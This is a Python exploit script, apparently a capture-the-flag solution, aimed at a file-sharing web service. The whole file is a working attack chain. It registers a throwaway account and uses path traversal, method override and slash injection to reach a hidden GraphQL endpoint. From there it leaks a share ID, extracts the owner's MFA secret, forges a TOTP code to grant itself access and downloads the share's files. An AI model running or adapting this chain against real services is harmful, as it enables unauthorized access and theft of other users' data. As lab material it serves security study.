import base64
import os
from urllib.parse import quote

import pyotp
import requests

username = os.urandom(8).hex()
password = os.urandom(8).hex()
# shareLink/fileId from malicious command in level 1
shareLink = "917a21561b01ce0ff51a064e2362d2c3070192809a3170755d1f385925d8185ee2f8ae9d3d9ab8c172e9324aae6d9807"
fileId = "ef676bd0-d321-40ae-b7e5-f5a88dd2a77b"

BASEURL = "https://fileshare.fr"

sess = requests.Session()

r = sess.post(f"{BASEURL}/rest/auth/register", json={"username": username, "password": password})
r.raise_for_status()

r = sess.post(f"{BASEURL}/rest/auth/login", json={"username": username, "password": password})
sess.headers["Authorization"] = "Bearer " + r.json()["access_token"]
r.raise_for_status()


def graphql_query(query):
    path = "/_dev/gql/%3Fquery=" + quote(query) + "&"  # make query to GraphQL
    path += "_method=POST&"  # make it a POST request (thanks method-override)
    path = "../../../../" + path  # path traversal to remove original REST path
    path = path.replace("/", "$'")  # exploit .replace to inject slashes
    r = sess.get(f"{BASEURL}/rest/shares/{fileId}/files/{path}")
    r.raise_for_status()
    return r.json()


result = graphql_query(
    """
{
    fileShare(shareLink: "%(shareLink)s", fileId: "%(fileId)s") {
        file {
            id name path
        }
    }
}
"""
    % dict(shareLink=shareLink, fileId=fileId)
)
# {'errors': [{'message': 'Access forbidden to share <UID>.', 'statusCode': 403}], 'data': {'fileShare': None}}
shareId = result["errors"][0]["message"].split("share ")[1].strip(".")
print(f"Got shareId {shareId}")

result = graphql_query(
    """
mutation {
    giveAccess(id: "%(shareId)s", otp: "123456", username: "%(username)s") {
        success message
        owner {
            id
            ... on PublicUser { username role verified }
            ... on User { username salt role verified mfa_secret }
        }
        share { id name isPublic link validUntil owner
            allowedUsers {
                id
                ... on PublicUser { username role verified }
                ... on User { username salt role verified mfa_secret }
            }
            files
        }
    }
}
"""
    % dict(shareId=shareId, username=username)
)
shareInfo = result["data"]["giveAccess"]["share"]
userInfo = result["data"]["giveAccess"]["owner"]
print(f"Got MFA secret {userInfo['mfa_secret']}")

token = pyotp.TOTP(userInfo["mfa_secret"]).now()
result = graphql_query(
    """
mutation {
    giveAccess(id: "%(shareId)s", otp: "%(otp)s", username: "%(username)s") {
        success message
        owner {
            id
            ... on PublicUser { username role verified }
            ... on User { username salt role verified mfa_secret }
        }
        share { id name isPublic link validUntil owner
            allowedUsers {
                id
                ... on PublicUser { username role verified }
                ... on User { username salt role verified mfa_secret }
            }
            files
        }
    }
}
"""
    % dict(otp=token, shareId=shareId, username=username)
)
assert result["data"]["giveAccess"]["success"]

# OK, now we have access!
result = graphql_query(
    """
{
    downloadShare(id: "%(shareId)s") {
        share { id name isPublic link validUntil }
        zipContent
    }
}
"""
    % dict(shareId=shareId)
)
with open("share.zip", "wb") as outf:
    outf.write(base64.b64decode(result["data"]["downloadShare"]["zipContent"]))

print("Done, share.zip downloaded!")
